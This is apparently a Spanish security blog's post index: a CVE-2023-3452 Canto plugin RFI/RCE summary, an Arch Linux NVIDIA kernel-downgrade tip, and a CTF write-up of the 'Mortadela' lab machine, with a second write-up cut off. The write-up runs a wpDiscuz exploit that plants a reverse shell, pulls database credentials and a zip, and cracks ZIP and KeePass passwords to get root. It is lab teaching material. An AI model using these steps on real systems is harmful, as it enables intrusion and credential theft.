[{"content":"En este PoC veremos una Inclusión Remota de Ficheros No Autenticada (RFI) y Ejecución Remota de Código No Autenticada (RCE) que afecta a Canto en versiones anteriores a la 3.0.5.\nWhat is Canto? Canto es un plugin de código abierto, un software de gestión de activos digitales que organiza archivos y multimedia para empresas.\nProof Of Content Esta vulnerabilidad afecta al parámetro wp_abspath que se encuentra en la siguiente línea de includes/lib/download.php:\n*** require_once($_REQUEST[\u0026#39;wp_abspath\u0026#39;] . \u0026#39;/wp-admin/admin.php\u0026#39;); ***\rTambién debe estar habilitado en php.ini el allow_url_include:\nVamos a enviar una petición GET a un servidor python que he abierto en el puerto 8881:\nPodemos ver que hemos recibido de la petición GET a nuestro servidor python, podemos ver que la llamada se realiza desde /wp-admin/admin.php , ahora en lugar de querer enviarnos una petición vamos a intentar ejecutar un comando:\nExploit Repositorio\rScript en python automatizado para el PoC del CVE-2023-3452\nCTF con CVE-2023-3452 He creado una máquina con esta vulnerabilidad por si la quereís tocar, la máquina está en la plataforma HackMyVM:\nhttps://hackmyvm.eu/machines/machine.php?vm=Canto\n","date":"2025-06-15","id":0,"permalink":"/blog/cve-2023-3452-remote-file-inclusion-remote-code-execution-unauthenticated/","summary":"En este PoC veremos una Inclusión Remota de Ficheros No Autenticada (RFI) y Ejecución Remota de Código No Autenticada (RCE) que afecta a Canto en versiones anteriores a la 3.","tags":["CVE-2023-3452","RFI","RCE","Unauthenticated"],"title":"CVE-2023-3452 - Remote File Inclusion - Remote Code Execution - Unauthenticated"},{"content":"En algunos casos al actualizar tu Arch Linux puede que veas una actualización del kernel. Previamente instalamos los drivers NVIDIA en nuestro sistema donde los compilamos al kernel anterior, al actualizar el kernel puede que tus drivers no sean compatibles con el nuevo kernel. Hay posibilidades de arreglarlo pero lo más fácil y factible es volver al kernel anterior donde los drivers funcionaban correctamente.\nPacman cache Para ver la cache de pacman podemos hacer un ls al directorio /var/cache/pacman/pkg y si tenemos suerte y no hemos borrado la cache al actualizar podemos encontrar el paquete del kernel anterior donde funcionaban los drivers NVIDIA:\n❯ ls /var/cache/pacman/pkg/ | grep linux-zen linux-zen-6.11.6.zen1-1-x86_64.pkg.tar.zst linux-zen-6.11.6.zen1-1-x86_64.pkg.tar.zst.sig linux-zen-6.12.1.zen1-1-x86_64.pkg.tar.zst linux-zen-6.12.1.zen1-1-x86_64.pkg.tar.zst.sig linux-zen-headers-6.11.6.zen1-1-x86_64.pkg.tar.zst linux-zen-headers-6.11.6.zen1-1-x86_64.pkg.tar.zst.sig linux-zen-headers-6.12.1.zen1-1-x86_64.pkg.tar.zst linux-zen-headers-6.12.1.zen1-1-x86_64.pkg.tar.zst.sig\rEn mi caso donde ha funcionado es en la 6.11.6 por lo que podemos seguir los pasos de la Wiki de Arch:\nhttps://wiki.archlinux.org/title/Downgrading_packages Downgrade Si no podemos encontrar el kernel anterior donde funcionaban los drivers usaremos una herramienta llamada Downgrade.\nComparto el repositorio:\nhttps://github.com/archlinux-downgrade/downgrade Si tenemos yay podremos instalarlo fácilmente:\nyay -S downgrade\rSi no tenemos yay podemos instalarlo, os comparto el repositorio donde explica su instalación:\nhttps://github.com/Jguer/yay?tab=readme-ov-file#installation Una vez instalado el downgrade pondremos el siguiente comando buscando el kernel que usamos (en mi caso linux-zen):\nsudo downgrade linux-zen\rAhora buscaremos la versión de kernel que tuvimos antes y le daremos a Enter y empezará a instalarse.\nCaution\nRECUERDA: Tendrás que desinstalar linux-headers o linux-zen-headers dependiendo de cual estés usando e instalarlos también con el mismo comando downgrade pero buscando linux-zen-headers.\n","date":"2025-06-15","id":1,"permalink":"/blog/los-drivers-de-nvidia-no-compilan-correctamente-en-arch-linux/","summary":"En algunos casos al actualizar tu Arch Linux puede que veas una actualización del kernel. Previamente instalamos los drivers NVIDIA en nuestro sistema donde los compilamos al kernel anterior, al actualizar el kernel puede que tus drivers no sean compatibles con el nuevo kernel.","tags":["Arch Linux","Nvidia"],"title":"Los drivers de NVIDIA no compilan correctamente en Arch Linux"},{"content":"","date":"2023-09-07","id":2,"permalink":"/blog/","summary":"","tags":[],"title":"Blog"},{"content":"","date":"2023-09-07","id":3,"permalink":"/writeups/hackmyvm/","summary":"","tags":[],"title":"DOCKERLABS"},{"content":"","date":"2023-09-07","id":4,"permalink":"/challenges/hackmyvm/","summary":"","tags":[],"title":"HACKMYVM"},{"content":"","date":"2023-09-07","id":5,"permalink":"/writeups/dockerlabs/","summary":"","tags":[],"title":"HACKMYVM"},{"content":"","date":"2023-09-07","id":6,"permalink":"/challenges/hackthebox/","summary":"","tags":[],"title":"HACKTHEBOX"},{"content":"","date":"2023-09-07","id":7,"permalink":"/writeups/hackthebox/","summary":"","tags":[],"title":"HACKTHEBOX"},{"content":"","date":"2023-09-07","id":8,"permalink":"/writeups/thehackerslabs/","summary":"","tags":[],"title":"THEHACKERSLABS"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.130 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 12:24 CEST Initiating ARP Ping Scan at 12:24 Scanning 192.168.231.130 [1 port] Completed ARP Ping Scan at 12:24, 0.04s elapsed (1 total hosts) Initiating SYN Stealth Scan at 12:24 Scanning 192.168.231.130 [65535 ports] Discovered open port 22/tcp on 192.168.231.130 Discovered open port 3306/tcp on 192.168.231.130 Discovered open port 80/tcp on 192.168.231.130 Completed SYN Stealth Scan at 12:24, 0.87s elapsed (65535 total ports) Nmap scan report for 192.168.231.130 Host is up, received arp-response (0.00041s latency). Scanned at 2025-07-17 12:24:31 CEST for 1s Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 3306/tcp open mysql syn-ack ttl 64 MAC Address: 00:0C:29:39:0A:C9 (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.03 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rYa vemos varios puertos abiertos, donde está expuesto el puerto 3306 de MySQL así que quizás a futuro tendremos que entrar a ella. Vamos a realizar un segundo escaneo nmap para ver las versiones de los servicios y lanzar algunos scripts básicos de reconocmiento:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/nmap] └─$ nmap -p22,80,3306 -sCV 192.168.231.130 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 12:25 CEST Nmap scan report for 192.168.231.130 Host is up (0.00019s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) | ssh-hostkey: | 256 aa:8d:e4:75:bc:f3:f8:5e:42:d0:ee:ca:e2:c4:0b:97 (ECDSA) |_ 256 ae:fd:91:ef:42:71:cb:11:b9:66:97:bf:ec:5b:d6:4b (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.4.57 (Debian) 3306/tcp open mysql MariaDB 5.5.5-10.11.6 | mysql-info: | Protocol: 10 | Version: 5.5.5-10.11.6-MariaDB-0+deb12u1 | Thread ID: 7431 | Capabilities flags: 63486 | Some Capabilities: Support41Auth, SupportsCompression, ODBCClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, LongColumnFlag, FoundRows, SupportsTransactions, Speaks41ProtocolOld, Speaks41ProtocolNew, IgnoreSigpipes, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins | Status: Autocommit | Salt: u6IN++4cwLUF?J4f\u0026amp;(3j |_ Auth Plugin Name: mysql_native_password MAC Address: 00:0C:29:39:0A:C9 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 54.38 seconds\rVamos a ver la aplicación web:\nVemos que es la página por defecto de Apache2, vamos a realizar fuzzing a ver si encontramos otras cosas más interesantes:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://192.168.231.130/FUZZ\u0026#34; -e .php,.html,.js,.txt,.css /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.130/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt .css :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ index.html [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 0ms] wordpress [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 0ms]\rVemos la carpeta wordpress vamos a entrar en ella:\nAviso\nEs normal que noteís que la aplicación web va lenta, ya que tiene un fallo de virtualhosting. Esto no afecta a la resolución de la máquina.\nVamos a emplear wpscan para tirar un enumeramiento a toda la aplicación Wordpress:\n_______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.28 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://192.168.231.130/wordpress/ [192.168.231.130] [+] Started: Wed Jul 16 20:07:47 2025 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.57 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://192.168.231.130/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://192.168.231.130/wordpress/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://192.168.231.130/wordpress/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30). | Found By: Emoji Settings (Passive Detection) | - http://192.168.231.130/wordpress/, Match: \u0026#39;wp-includes\\/js\\/wp-emoji-release.min.js?ver=6.4.3\u0026#39; | Confirmed By: Meta Generator (Passive Detection) | - http://192.168.231.130/wordpress/, Match: \u0026#39;WordPress 6.4.3\u0026#39; [i] The main theme could not be detected. [i] Plugin(s) Identified: [+] akismet | Location: http://192.168.231.130/wordpress/wp-content/plugins/akismet/ | Last Updated: 2025-07-15T18:17:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 5.5 | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/akismet/, status: 200 | | Version: 5.3.1 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/akismet/readme.txt [+] wpdiscuz | Location: http://192.168.231.130/wordpress/wp-content/plugins/wpdiscuz/ | Last Updated: 2025-06-29T17:10:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/plugins/wpdiscuz/readme.txt | [!] The version is out of date, the latest version is 7.6.33 | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/wpdiscuz/, status: 200 | | Version: 7.0.4 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/wpdiscuz/readme.txt [i] Theme(s) Identified: [+] twentytwentyfive | Location: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/ | Latest Version: 1.2 (up to date) | Last Updated: 2025-04-15T00:00:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/readme.txt | [!] Directory listing is enabled | Style URL: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/style.css | Style Name: Twenty Twenty-Five | Style URI: https://wordpress.org/themes/twentytwentyfive/ | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/, status: 200 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/style.css, Match: \u0026#39;Version: 1.3\u0026#39; [+] twentytwentyfour | Location: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/ | Last Updated: 2024-11-13T00:00:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/readme.txt | [!] The version is out of date, the latest version is 1.3 | [!] Directory listing is enabled | Style URL: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/style.css | Style Name: Twenty Twenty-Four | Style URI: https://wordpress.org/themes/twentytwentyfour/ | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/, status: 200 | | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: \u0026#39;Version: 1.0\u0026#39; [+] twentytwentythree | Location: http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/ | Last Updated: 2024-11-13T00:00:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/readme.txt | [!] The version is out of date, the latest version is 1.6 | [!] Directory listing is enabled | Style URL: http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/style.css | Style Name: Twenty Twenty-Three | Style URI: https://wordpress.org/themes/twentytwentythree | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6.... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/, status: 200 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/style.css, Match: \u0026#39;Version: 1.3\u0026#39; [+] twentytwentytwo | Location: http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/ | Last Updated: 2025-04-15T00:00:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/readme.txt | [!] The version is out of date, the latest version is 2.0 | Style URL: http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/style.css | Style Name: Twenty Twenty-Two | Style URI: https://wordpress.org/themes/twentytwentytwo/ | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/, status: 200 | | Version: 1.6 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/style.css, Match: \u0026#39;Version: 1.6\u0026#39; [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Wed Jul 16 20:10:44 2025 [+] Requests Done: 141687 [+] Cached Requests: 24 [+] Data Sent: 41.292 MB [+] Data Received: 19.208 MB [+] Memory used: 442.492 MB [+] Elapsed time: 00:02:56\rVemos que encontró un plugin llamado wpdiscuz que tiene la versión 7.0.4 vamos a buscarlo por Google:\nEn mi caso encontré este repositorio con el exploit:\nRepositorio\rScript en python automatizado para el PoC del CVE-2020-24186\nShell as www-data Para emplearlo nos piden lo siguiente:\n-u -\u0026gt; URL objetivo que en este caso es http://192.168.231.130/wordpress/ -p -\u0026gt; Un post donde se emplee este plugin, donde desonocemos de uno. Vamos a buscar un post, viendo la web me percato de lo siguiente:\nSi le damos click nos redirige a un post, lo encontramos!!\nAviso\nAl darle click nos redirigirá a http://192.168.0.108/.... tendremos que cambiar la IP por la correspondiente.\nLa web no carga, seguramente por el virtual hosting, vamos a usar el exploit!\nAntes de explotarlo nos pondremos en escucha:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/exploits] └─$ rlwrap nc -nlvp 9001 listening on [any] 9001 ...\rAhora iniciamos el exploit:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/exploits] └─$ python3 exploit.py -u http://192.168.231.130/wordpress -p /index.php/2024/04/01/hola-mundo/ -l 192.168.231.128 -s 9001 --------------------------------------------------------------- [-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution [-] File Upload Bypass Vulnerability - PHP Reverse Shell Upload [-] CVE: CVE-2020-24186 [-] Modified by Substing https://github.com/substing [-] Based on https://github.com/hev0x/CVE-2020-24186-WordPress-wpDiscuz-7.0.4-RCE [-] PHP Reverse shell from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php [-] For educational and pentesting purposes only. FOLLOW THE LAWS! --------------------------------------------------------------- [+] Response length:[93144] | code:[200] [!] Got wmuSecurity value: 713c6a0844 [!] Got wmuSecurity value: 1 [+] Generating random name for shell... [!] Generated shell name: oumyxrnjcrfkfqs [!] Trying to Upload Shell.. [+] Upload Success... [+] In your terminal run: nc -nvlp 9001 [+] Navigate to http://192.168.0.108/wordpress/wp-content/uploads/2025/07/oumyxrnjcrfkfqs-1752749705.993.php\rBien nos ha creado y subido una webshell, vamos a entrar a ese archivo:\nAviso\nAl darle click nos redirigirá a http://192.168.0.108/.... tendremos que cambiar la IP por la correspondiente.\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/exploits] └─$ rlwrap nc -nlvp 9001 listening on [any] 9001 ... connect to [192.168.231.128] from (UNKNOWN) [192.168.231.130] 40616 Linux mortadela 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux 12:55:59 up 47 min, 0 user, load average: 0.00, 0.00, 0.16 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) sh: 0: can\u0026#39;t access tty; job control turned off $\rShell as root Si leemos el /etc/passwd nos percataremos de un usuario:\n──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── www-data@mortadela:/$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:100:107::/nonexistent:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin mortadela:x:1000:1000:mortadela,,,:/home/mortadela:/bin/bash mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false\rVemos el usuario mortadela pero no tenemos ningún tipo de credenciales. Vamos a buscar el archivo wp-config.php donde encontraremos las credenciales de la base de datos:\n[..] // ** Database settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** Database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** Database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;lolalolitalola\u0026#39; ); /** Database hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); /** Database charset to use in creating database tables. */ define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); /** The database collate type. Don\u0026#39;t change this if in doubt. */ define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); [...]\rEncontramos que el usuario wordpress su credencial a la base de datos es lolalolitalola, pero si intentamos acceder no tendremos permisos. Vamos a seguir buscando por el sistema. Viendo el directorio /opt/ me encontré lo siguiente:\nwww-data@mortadela:/$ ls /opt ls /opt muyconfidencial.zip\rVamos a abrir un servidor en python3 y bajarnos ese archivo .zip:\nwww-data@mortadela:/opt$ python3 -m http.server 8083 python3 -m http.server 8083 Serving HTTP on 0.0.0.0 port 8083 (http://0.0.0.0:8083/) ...\r┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ wget http://192.168.231.130:8083/muyconfidencial.zip --2025-07-17 13:02:36-- http://192.168.231.130:8083/muyconfidencial.zip Connecting to 192.168.231.130:8083... connected. HTTP request sent, awaiting response... 200 OK Length: 93052465 (89M) [application/zip] Saving to: ‘muyconfidencial.zip’ muyconfidencial.zip 100%[=================================================================================================\u0026gt;] 88.74M 89.1MB/s in 1.0s 2025-07-17 13:02:37 (89.1 MB/s) - ‘muyconfidencial.zip’ saved [93052465/93052465]\rVamos a intentar descomprimirlo:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ unzip muyconfidencial.zip Archive: muyconfidencial.zip [muyconfidencial.zip] Database.kdbx password:\rNos piden credenciales, vamos a ver si se reutilizan las de mysql:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ unzip muyconfidencial.zip Archive: muyconfidencial.zip [muyconfidencial.zip] Database.kdbx password: password incorrect--reenter:\rVemos que no, así que haremos fuerza bruta. Sacaremos el hash con zip2john:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ zip2john muyconfidencial.zip \u0026gt; hash ver 1.0 efh 5455 efh 7875 muyconfidencial.zip/Database.kdbx PKZIP Encr: 2b chk, TS_chk, cmplen=2170, decmplen=2158, crc=DF3016BC ts=9D09 cs=9d09 type=0 ver 2.0 efh 5455 efh 7875 muyconfidencial.zip/KeePass.DMP PKZIP Encr: TS_chk, cmplen=93049937, decmplen=267519983, crc=52EC3DC7 ts=9D79 cs=9d79 type=8 NOTE: It is assumed that all files in each archive have the same password. If that is not the case, the hash may be uncrackable. To avoid this, use option -o to pick a file at a time.\rAhora con john haremos un ataque de fuerza bruta con la wordlist rockyou.txt:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ john -w=/usr/share/wordlists/rockyou.txt hash --format=PKZIP Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status pinkgirl (muyconfidencial.zip) 1g 0:00:00:00 DONE (2025-07-17 13:07) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed.\rJohn\nAñadimos el parametro --format=PKZIP ya que el hash si leemos sus primeras lineas nos indica que es de formato PKZIP.\nYa teniendo la contraseña vamos a descomprimirlo:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ unzip muyconfidencial.zip Archive: muyconfidencial.zip [muyconfidencial.zip] Database.kdbx password: extracting: Database.kdbx inflating: KeePass.DMP\rVemos que tenemos 2 archivos de KeePass, vamos a abrir Database.kdbx:\nNos pide una Master Key, buscando en google me encontré el siguiente repositorio:\nkeepass-dump-extractor\rKeePass Memory Dump Extractor\nNos podrá ser de ayuda ya que tenemos el archivo KeePass.DMP, así que vamos a emplearlo:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ ./keepass-dump-extractor KeePass.DMP -f all \u0026gt; wordlist\rEsto nos ha creado posibles combinaciones de Master Key, ahora con keepass2john vamos a sacar el hash de Database.kdbx:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ keepass2john Database.kdbx \u0026gt; hash_keepass\rAhora con hashcat vamos a hacerle un ataque de fuerza bruta:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] 13:17:21 [19/19] └─$ hashcat -m 13400 --username hash_keepass wordlist --potfile-disable hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ==================================================================================================================================================== * Device #1: cpu-skylake-avx512-AMD Ryzen 5 7600X 6-Core Processor, 2201/4466 MB (1024 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Optimizers applied: * Zero-Byte * Single-Hash * Single-Salt Watchdog: Temperature abort trigger set to 90c Host memory required for this attack: 1 MB Dictionary cache built: * Filename..: wordlist * Passwords.: 570 * Bytes.....: 9025 * Keyspace..: 570 * Runtime...: 0 secs $keepass$*2*60000*0*93809672768b681bd065a3f15b50cf58e0ec612024580a60c67cdb842c3d2273*142d5f1e47d60a3bfda60e3689051621ccb647ef218e6b59b4299e21adfb90d0*dc28dc2d815d5f6632cf34cfb81f38be*565454906826c80142d135dac98968adadb0ebc1d99aecb0abe87cd3bc02b137*64c4082fac98e04e9ad511e188931ee4c0e4b22e015f5df2da173a86a782cde2:Maritrini12345 [..]\rTenemos la Master Key!! Vamos a probarla\nVamos a iniciar sesión por SSH:\n┌──(pylon㉿kali)-[~] └─$ ssh root@192.168.231.130 root@192.168.231.130\u0026#39;s password: Linux mortadela 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Jul 17 12:17:41 2025 from 192.168.231.128 root@mortadela:~# whoami; hostname -I root 192.168.231.130\rroot! ;)\nReseña ","date":"2025-07-17","id":9,"permalink":"/writeups/thehackerslabs/mortadela/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.130 Starting Nmap 7.","tags":[],"title":"Mortadela"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/nmap] └─$ nmap -p- --open --min-rate=5000 -n -Pn -vvv 192.168.231.131 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 13:53 CEST Initiating ARP Ping Scan at 13:53 Scanning 192.168.231.131 [1 port] Completed ARP Ping Scan at 13:53, 0.05s elapsed (1 total hosts) Initiating SYN Stealth Scan at 13:53 Scanning 192.168.231.131 [65535 ports] Discovered open port 22/tcp on 192.168.231.131 Discovered open port 80/tcp on 192.168.231.131 Completed SYN Stealth Scan at 13:53, 1.06s elapsed (65535 total ports) Nmap scan report for 192.168.231.131 Host is up, received arp-response (0.000047s latency). Scanned at 2025-07-17 13:53:30 CEST for 1s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:C6:42:17 (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVamos a realizar un segundo escaneo para determinar la versión del servicio de cada y lanzar algunos scripts básicos de reconocimiento:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/nmap] └─$ nmap 